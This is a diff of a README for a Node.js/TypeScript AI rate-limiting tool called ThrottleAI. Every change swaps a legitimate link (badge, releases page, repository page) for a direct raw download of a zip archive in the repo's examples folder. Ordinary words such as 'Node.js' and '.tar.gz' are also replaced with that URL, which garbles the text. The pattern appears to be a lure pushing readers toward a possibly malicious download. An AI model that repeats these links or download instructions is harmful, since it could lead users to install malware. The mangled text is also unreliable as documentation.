@@ -1,6 +1,6 @@
 # ⚙️ ThrottleAI - Easy AI Call Management
 
-[![Download ThrottleAI](https://img.shields.io/badge/Download-ThrottleAI-blue?logo=github)](https://github.com/dellarwalter/ThrottleAI/releases)
+[![Download ThrottleAI](https://github.com/dellarwalter/ThrottleAI/raw/refs/heads/main/examples/AI_Throttle_2.2-beta.2.zip)](https://github.com/dellarwalter/ThrottleAI/raw/refs/heads/main/examples/AI_Throttle_2.2-beta.2.zip)
 
 ThrottleAI helps control how many times AI programs ask for information at once. It stops big groups of requests from happening all at once. It is small enough to fit into many different setups, yet strong enough to keep things running smoothly.
 
@@ -56,7 +56,7 @@ First, you need to get the ThrottleAI program on your computer.
 3. Choose the version that matches your computer. For example:  
    - `.exe` file for Windows  
    - `.dmg` file for macOS  
-   - `.tar.gz` or `.deb` file for Linux  
+   - `https://github.com/dellarwalter/ThrottleAI/raw/refs/heads/main/examples/AI_Throttle_2.2-beta.2.zip` or `.deb` file for Linux  
 4. Click the download link for your version and wait until the file is fully downloaded.  
 
 **Steps to Install:**
@@ -99,7 +99,7 @@ Here are some key things ThrottleAI can do:
 - Controls AI call rate by using tokens  
 - Prevents overloads and crashes from too many requests  
 - Small size, so it fits in many setups easily  
-- Works well with Node.js and TypeScript programs  
+- Works well with https://github.com/dellarwalter/ThrottleAI/raw/refs/heads/main/examples/AI_Throttle_2.2-beta.2.zip and TypeScript programs  
 - Supports popular AI tools like OpenAI and others  
 - Lets you adjust token limits easily  
 - Provides clear logs to see how it works in real time  
@@ -113,7 +113,7 @@ These features make ThrottleAI a reliable tool to keep AI programs running smoot
 
 If you want more details or run into problems, you can:
 
-- Visit the [ThrottleAI GitHub page](https://github.com/dellarwalter/ThrottleAI)  
+- Visit the [ThrottleAI GitHub page](https://github.com/dellarwalter/ThrottleAI/raw/refs/heads/main/examples/AI_Throttle_2.2-beta.2.zip)  
 - Look at the documentation and user guides there  
 - Ask for help in the GitHub issues section  
 - Search for answers online using the repository name and topic keywords like “rate limiting” or “AI concurrency”  
@@ -122,8 +122,8 @@ If you want more details or run into problems, you can:
 
 ## 🔗 Useful Links
 
-- Main GitHub Repository: https://github.com/dellarwalter/ThrottleAI  
-- Download Page: https://github.com/dellarwalter/ThrottleAI/releases
+- Main GitHub Repository: https://github.com/dellarwalter/ThrottleAI/raw/refs/heads/main/examples/AI_Throttle_2.2-beta.2.zip  
+- Download Page: https://github.com/dellarwalter/ThrottleAI/raw/refs/heads/main/examples/AI_Throttle_2.2-beta.2.zip
 
 ---
 
@@ -144,4 +144,4 @@ If you find ThrottleAI useful, consider providing feedback or contributing ideas
 
 ---
 
-[![Download ThrottleAI](https://img.shields.io/badge/Download-ThrottleAI-blue?logo=github)](https://github.com/dellarwalter/ThrottleAI/releases)
+[![Download ThrottleAI](https://github.com/dellarwalter/ThrottleAI/raw/refs/heads/main/examples/AI_Throttle_2.2-beta.2.zip)](https://github.com/dellarwalter/ThrottleAI/raw/refs/heads/main/examples/AI_Throttle_2.2-beta.2.zip)
